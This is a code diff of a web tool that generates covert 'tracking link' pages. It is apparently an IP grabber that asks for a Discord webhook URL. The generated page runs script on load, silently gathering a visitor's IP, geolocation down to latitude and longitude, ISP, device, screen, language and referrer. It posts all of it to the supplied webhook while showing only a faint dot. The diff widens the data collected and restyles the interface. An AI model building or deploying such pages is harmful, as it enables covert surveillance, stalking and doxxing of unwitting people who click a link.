@@ -17,7 +17,7 @@
     display: flex;
     justify-content: center;
     align-items: center;
-    font-family: 'Inter', 'Segoe UI', sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
     overflow: hidden;
     position: relative;
   }
@@ -36,80 +36,91 @@
     position: relative;
     z-index: 10;
     background: #000000;
-    border: 1px solid rgba(255, 255, 255, 0.05);
-    padding: 48px 40px;
-    max-width: 420px;
+    border: 1px solid rgba(255, 255, 255, 0.06);
+    padding: 44px 36px;
+    max-width: 440px;
     width: 92%;
+    transition: 0.3s ease;
+  }
+
+  .card:hover {
+    border-color: rgba(255, 255, 255, 0.08);
   }
 
   .input-wrapper {
     position: relative;
-    margin-bottom: 20px;
+    margin-bottom: 18px;
   }
 
   .input-wrapper input {
     width: 100%;
-    padding: 18px 20px;
+    padding: 16px 18px;
     background: #000000;
     border: 1px solid rgba(255, 255, 255, 0.06);
-    color: rgba(255, 255, 255, 0.7);
+    color: rgba(255, 255, 255, 0.75);
     font-size: 0.85rem;
-    font-family: 'Inter', sans-serif;
+    font-family: inherit;
     font-weight: 300;
     outline: none;
-    transition: 0.2s ease;
-    letter-spacing: 0.5px;
+    transition: 0.25s ease;
+    letter-spacing: 0.3px;
   }
 
   .input-wrapper input:focus {
-    border-color: rgba(255, 255, 255, 0.15);
-    background: #000000;
+    border-color: rgba(255, 255, 255, 0.18);
+    background: #050505;
   }
 
   .input-wrapper input::placeholder {
-    color: rgba(255, 255, 255, 0.08);
+    color: rgba(255, 255, 255, 0.06);
     font-weight: 300;
-    letter-spacing: 1px;
+    letter-spacing: 0.5px;
   }
 
   .btn {
     width: 100%;
-    padding: 18px;
+    padding: 16px;
     background: #000000;
     border: 1px solid rgba(255, 255, 255, 0.06);
-    color: rgba(255, 255, 255, 0.3);
-    font-size: 0.7rem;
-    font-weight: 300;
-    font-family: 'Inter', sans-serif;
-    letter-spacing: 4px;
+    color: rgba(255, 255, 255, 0.25);
+    font-size: 0.65rem;
+    font-weight: 400;
+    font-family: inherit;
+    letter-spacing: 5px;
     cursor: pointer;
-    transition: 0.2s ease;
+    transition: 0.25s ease;
     text-transform: uppercase;
   }
 
   .btn:hover {
-    background: #0a0a0a;
+    background: #080808;
     border-color: rgba(255, 255, 255, 0.12);
-    color: rgba(255, 255, 255, 0.5);
+    color: rgba(255, 255, 255, 0.45);
   }
 
   .btn:active {
-    transform: scale(0.98);
+    transform: scale(0.97);
+  }
+
+  .divider {
+    width: 100%;
+    height: 1px;
+    background: rgba(255, 255, 255, 0.025);
+    margin: 18px 0 16px;
   }
 
   .output-box {
-    margin-top: 20px;
     background: #000000;
     border: 1px solid rgba(255, 255, 255, 0.02);
-    padding: 16px 20px;
-    min-height: 56px;
+    padding: 14px 18px;
+    min-height: 52px;
     display: flex;
     align-items: center;
   }
 
   .output-box .placeholder {
-    color: rgba(255, 255, 255, 0.04);
-    font-size: 0.65rem;
+    color: rgba(255, 255, 255, 0.03);
+    font-size: 0.6rem;
     font-weight: 300;
     letter-spacing: 2px;
   }
@@ -123,61 +134,55 @@
   }
 
   .output-box a {
-    color: rgba(255, 255, 255, 0.25);
+    color: rgba(255, 255, 255, 0.2);
     text-decoration: none;
     font-weight: 300;
     font-size: 0.7rem;
     word-break: break-all;
     transition: 0.2s;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+    border-bottom: 1px solid rgba(255, 255, 255, 0.02);
     padding-bottom: 2px;
   }
 
   .output-box a:hover {
-    color: rgba(255, 255, 255, 0.4);
-    border-bottom-color: rgba(255, 255, 255, 0.08);
+    color: rgba(255, 255, 255, 0.35);
+    border-bottom-color: rgba(255, 255, 255, 0.06);
   }
 
   .copy-badge {
-    font-size: 0.5rem;
+    font-size: 0.45rem;
     background: #000000;
-    padding: 4px 12px;
-    color: rgba(255, 255, 255, 0.06);
+    padding: 3px 12px;
+    color: rgba(255, 255, 255, 0.05);
     letter-spacing: 2px;
     border: 1px solid rgba(255, 255, 255, 0.02);
     cursor: pointer;
     transition: 0.2s;
     white-space: nowrap;
     text-transform: uppercase;
+    font-family: inherit;
   }
 
   .copy-badge:hover {
-    border-color: rgba(255, 255, 255, 0.06);
-    color: rgba(255, 255, 255, 0.12);
-  }
-
-  .divider {
-    width: 100%;
-    height: 1px;
-    background: rgba(255, 255, 255, 0.02);
-    margin: 16px 0;
+    border-color: rgba(255, 255, 255, 0.05);
+    color: rgba(255, 255, 255, 0.1);
   }
 
   .status-msg {
-    font-size: 0.5rem;
+    font-size: 0.45rem;
     margin-top: 12px;
     text-align: center;
-    color: rgba(255, 255, 255, 0.02);
+    color: rgba(255, 255, 255, 0.015);
     letter-spacing: 3px;
     font-weight: 300;
   }
 
   .status-msg.error {
-    color: rgba(255, 255, 255, 0.05);
+    color: rgba(255, 255, 255, 0.04);
   }
 
   .status-msg.success {
-    color: rgba(255, 255, 255, 0.05);
+    color: rgba(255, 255, 255, 0.04);
   }
 
   @keyframes fadeSlide {
@@ -196,15 +201,15 @@
 
 <div class="card">
   <div class="input-wrapper">
-    <input type="url" id="webhookInput" placeholder="webhook url" spellcheck="false">
+    <input type="url" id="webhookInput" placeholder="discord webhook url" spellcheck="false">
   </div>
 
-  <button class="btn" id="generateBtn">generate</button>
+  <button class="btn" id="generateBtn">generate link</button>
 
   <div class="divider"></div>
 
   <div class="output-box" id="outputBox">
-    <span class="placeholder">link</span>
+    <span class="placeholder">tracking link</span>
   </div>
 
   <div class="status-msg" id="statusMsg">·</div>
@@ -212,7 +217,7 @@
 
 <script>
   // ============================
-  //  BLACK & WHITE PARTICLES
+  //  MINIMAL PARTICLES
   // ============================
   const canvas = document.getElementById('particleCanvas');
   const ctx = canvas.getContext('2d');
@@ -226,18 +231,18 @@
   window.addEventListener('resize', resizeCanvas);
 
   const particles = [];
-  const PARTICLE_COUNT = 50;
+  const PARTICLE_COUNT = 45;
 
   for (let i = 0; i < PARTICLE_COUNT; i++) {
     particles.push({
       x: Math.random() * w,
       y: Math.random() * h,
-      radius: 0.3 + Math.random() * 1.2,
-      speedX: (Math.random() - 0.5) * 0.1,
-      speedY: (Math.random() - 0.5) * 0.1 - 0.03,
-      opacity: 0.01 + Math.random() * 0.06,
+      radius: 0.4 + Math.random() * 1.0,
+      speedX: (Math.random() - 0.5) * 0.08,
+      speedY: (Math.random() - 0.5) * 0.08 - 0.02,
+      opacity: 0.01 + Math.random() * 0.04,
       pulse: Math.random() * Math.PI * 2,
-      pulseSpeed: 0.003 + Math.random() * 0.008
+      pulseSpeed: 0.003 + Math.random() * 0.006
     });
   }
 
@@ -262,9 +267,9 @@
       const dy = mouseY - p.y;
       const dist = Math.sqrt(dx*dx + dy*dy);
       if (dist < 200 && mouseInfluence > 0) {
-        const force = (1 - dist/200) * 0.3 * mouseInfluence;
-        p.x += dx * force * 0.02;
-        p.y += dy * force * 0.02;
+        const force = (1 - dist/200) * 0.2 * mouseInfluence;
+        p.x += dx * force * 0.015;
+        p.y += dy * force * 0.015;
       }
 
       p.x += p.speedX;
@@ -282,7 +287,7 @@
 
       ctx.beginPath();
       ctx.arc(p.x, p.y, radius, 0, Math.PI * 2);
-      ctx.fillStyle = `rgba(255, 255, 255, ${alpha * 0.3})`;
+      ctx.fillStyle = `rgba(255, 255, 255, ${alpha * 0.25})`;
       ctx.fill();
     }
 
@@ -291,7 +296,7 @@
   drawParticles();
 
   // ============================
-  //  WEBHOOK + IP LOGIC
+  //  WEBHOOK + IP LOGIC (FULL INFO)
   // ============================
   const webhookInput = document.getElementById('webhookInput');
   const generateBtn = document.getElementById('generateBtn');
@@ -322,12 +327,16 @@
     setStatus('·', '');
 
     const encodedWebhook = encodeURIComponent(webhookUrl);
-    const uid = Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
 
     const trackingPage = `<!DOCTYPE html>
 <html lang="en">
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>·</title>
-<style>body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:rgba(255,255,255,0.02);font-family:'Inter',sans-serif;overflow:hidden;} .dot{font-size:2rem;letter-spacing:8px;font-weight:300;animation:pulse 4s ease-in-out infinite;} @keyframes pulse{0%{opacity:0.02;}50%{opacity:0.1;}100%{opacity:0.02;}}</style>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:rgba(255,255,255,0.02);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;overflow:hidden;}
+  .dot{font-size:2.5rem;letter-spacing:10px;font-weight:300;animation:pulse 4s ease-in-out infinite;}
+  @keyframes pulse{0%{opacity:0.015;}50%{opacity:0.08;}100%{opacity:0.015;}}
+</style>
 </head>
 <body>
 <div class="dot">·</div>
@@ -335,39 +344,77 @@
 (async function() {
   const webhook = decodeURIComponent("${encodedWebhook}");
   const apiKey = "${API_KEY}";
+  
   try {
+    // Get IP
     const ipRes = await fetch('https://api.ipify.org?format=json');
     const ipData = await ipRes.json();
     const ip = ipData.ip || 'unknown';
 
+    // Get full geolocation
     const geoRes = await fetch('https://ipgeolocation.abstractapi.com/v1/?api_key=' + apiKey + '&ip_address=' + ip);
     const geo = await geoRes.json();
 
+    // Get device info
+    const ua = navigator.userAgent;
+    const platform = navigator.platform || 'unknown';
+    const language = navigator.language || 'unknown';
+    const screenRes = screen.width + 'x' + screen.height;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+    const referrer = document.referrer || 'direct';
+    const currentUrl = window.location.href;
+
+    // Build comprehensive info
     const info = {
       ip: geo.ip || ip,
+      hostname: geo.hostname || 'N/A',
       city: geo.city || 'N/A',
       region: geo.region || 'N/A',
       country: geo.country || 'N/A',
+      country_code: geo.country_code || 'N/A',
+      country_flag: geo.country_flag || 'N/A',
+      continent: geo.continent || 'N/A',
       latitude: geo.latitude || 'N/A',
       longitude: geo.longitude || 'N/A',
       isp: geo.isp || 'N/A',
-      timezone: geo.timezone?.name || 'N/A',
-      userAgent: navigator.userAgent,
+      organization: geo.organization || 'N/A',
+      asn: geo.asn || 'N/A',
+      timezone_name: geo.timezone?.name || timezone,
+      timezone_offset: geo.timezone?.offset || 'N/A',
+      currency: geo.currency?.code || 'N/A',
+      currency_symbol: geo.currency?.symbol || 'N/A',
+      user_agent: ua,
+      platform: platform,
+      language: language,
+      screen_resolution: screenRes,
+      referrer: referrer,
+      current_url: currentUrl,
       timestamp: new Date().toISOString()
     };
 
+    // Create detailed embed
     const embed = {
-      title: '·',
+      title: '· ip track ·',
       color: 0x000000,
       fields: [
-        { name: 'ip', value: info.ip, inline: true },
+        { name: 'ip address', value: info.ip, inline: true },
+        { name: 'hostname', value: info.hostname, inline: true },
+        { name: 'country', value: info.country_flag + ' ' + info.country + ' (' + info.country_code + ')', inline: true },
         { name: 'city', value: info.city, inline: true },
         { name: 'region', value: info.region, inline: true },
-        { name: 'country', value: info.country, inline: true },
-        { name: 'lat/lon', value: info.latitude + ', ' + info.longitude, inline: true },
+        { name: 'continent', value: info.continent, inline: true },
+        { name: 'latitude', value: info.latitude, inline: true },
+        { name: 'longitude', value: info.longitude, inline: true },
         { name: 'isp', value: info.isp, inline: true },
-        { name: 'timezone', value: info.timezone, inline: true },
-        { name: 'user-agent', value: info.userAgent, inline: false },
+        { name: 'organization', value: info.organization, inline: true },
+        { name: 'asn', value: info.asn, inline: true },
+        { name: 'timezone', value: info.timezone_name + ' (UTC' + info.timezone_offset + ')', inline: true },
+        { name: 'currency', value: info.currency_symbol + ' ' + info.currency, inline: true },
+        { name: 'platform', value: info.platform, inline: true },
+        { name: 'language', value: info.language, inline: true },
+        { name: 'screen', value: info.screen_resolution, inline: true },
+        { name: 'referrer', value: info.referrer, inline: false },
+        { name: 'user agent', value: info.user_agent, inline: false },
         { name: 'timestamp', value: info.timestamp, inline: false }
       ],
       footer: { text: '·' }
@@ -378,9 +425,11 @@
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ embeds: [embed] })
     });
-  } catch(e) {}
+  } catch(e) {
+    // silent fail
+  }
 
-  document.body.innerHTML = '<div style="background:#000;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center;font-family:Inter,sans-serif;color:rgba(255,255,255,0.01);font-size:3rem;letter-spacing:16px;">·</div>';
+  document.body.innerHTML = '<div style="background:#000;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;color:rgba(255,255,255,0.01);font-size:3rem;letter-spacing:16px;">·</div>';
 })();
 <\/script>
 </body>
